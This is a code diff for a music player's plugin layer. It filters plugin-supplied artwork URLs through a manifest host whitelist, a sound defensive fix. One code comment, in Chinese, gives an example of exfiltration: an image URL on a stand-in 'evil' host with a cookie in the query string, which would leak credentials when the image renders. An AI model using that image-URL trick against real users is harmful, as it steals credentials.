@@ -7,6 +7,7 @@
  */
 
 import type { Album, Artist, Playlist, Song } from '@/api/types'
+import { safeResourceUrl } from './host/whitelist'
 import type { AlbumItem, ArtistItem, MusicItem, SheetItem } from './types'
 
 // ===================================================
@@ -62,7 +63,19 @@ export function minimalMusicItem(
 // 实体映射
 // ===================================================
 
-export function mapMusicItem(item: MusicItem, serverId: string): Song {
+/**
+ * 插件给的封面地址（PROTOCOL §5.2 说 coverArt 直接放 URL）。
+ *
+ * 为什么要过白名单：这个串最终进 `<img src>`，由**主窗口**发请求——沙箱 CSP
+ * 与 hostFetch 的白名单都管不到它。插件把 env.credentials 拼进 query
+ * （`https://evil/c.jpg?c=<cookie>`）就能靠一次渲染把凭据送出设备。
+ * 不在 manifest hosts 内、或不是 http(s) 的一律丢弃：宁可没有封面。
+ */
+function safeArtwork(raw: unknown, hosts: readonly string[]): string | undefined {
+  return safeResourceUrl(raw, hosts, { allowSmallDataImage: true }) ?? undefined
+}
+
+export function mapMusicItem(item: MusicItem, serverId: string, hosts: readonly string[]): Song {
   const song: Song = {
     id: String(item.id),
     title: String(item.title ?? ''),
@@ -70,8 +83,8 @@ export function mapMusicItem(item: MusicItem, serverId: string): Song {
     artistId: item.artistId ? String(item.artistId) : undefined,
     album: String(item.album ?? ''),
     albumId: item.albumId ? String(item.albumId) : undefined,
-    // 插件的 coverArt 直接就是 URL；不是 URL 时（如私有字段）交给原始缓存侧处理
-    coverArt: typeof item.artwork === 'string' ? item.artwork : undefined,
+    // 插件的 coverArt 直接就是 URL；白名单外或非 http(s) 的丢弃（见 safeArtwork）
+    coverArt: safeArtwork(item.artwork, hosts),
     duration: Number(item.duration) || 0,
     serverId,
     // VIP 曲（当前账号无权）：曲目行直接标 VIP，播放失败时用户能对上原因
@@ -91,13 +104,13 @@ function songExtras(item: MusicItem): { vip?: boolean; isrc?: string[] } | undef
   return ext
 }
 
-export function mapAlbumItem(item: AlbumItem, serverId: string): Album {
+export function mapAlbumItem(item: AlbumItem, serverId: string, hosts: readonly string[]): Album {
   const album: Album = {
     id: String(item.id),
     name: String(item.title ?? ''),
     artist: String(item.artist ?? ''),
     artistId: item.artistId ? String(item.artistId) : undefined,
-    coverArt: typeof item.artwork === 'string' ? item.artwork : undefined,
+    coverArt: safeArtwork(item.artwork, hosts),
     year: item.date ? Number(String(item.date).slice(0, 4)) || undefined : undefined,
     serverId,
   }
@@ -105,11 +118,11 @@ export function mapAlbumItem(item: AlbumItem, serverId: string): Album {
   return album
 }
 
-export function mapArtistItem(item: ArtistItem, serverId: string): Artist {
+export function mapArtistItem(item: ArtistItem, serverId: string, hosts: readonly string[]): Artist {
   const artist: Artist = {
     id: String(item.id),
     name: String(item.name ?? ''),
-    coverArt: typeof item.avatar === 'string' ? item.avatar : undefined,
+    coverArt: safeArtwork(item.avatar, hosts),
     serverId,
     sortIndex: pinyinInitial(item.name ?? ''),
   }
@@ -117,11 +130,11 @@ export function mapArtistItem(item: ArtistItem, serverId: string): Artist {
   return artist
 }
 
-export function mapSheetItem(item: SheetItem, serverId: string): Playlist {
+export function mapSheetItem(item: SheetItem, serverId: string, hosts: readonly string[]): Playlist {
   const playlist: Playlist = {
     id: String(item.id),
     name: String(item.title ?? ''),
-    coverArt: typeof item.artwork === 'string' ? item.artwork : undefined,
+    coverArt: safeArtwork(item.artwork, hosts),
     songCount: item.worksNum ? Number(item.worksNum) : undefined,
     owner: typeof item.createUser === 'string' ? item.createUser : undefined,
     serverId,
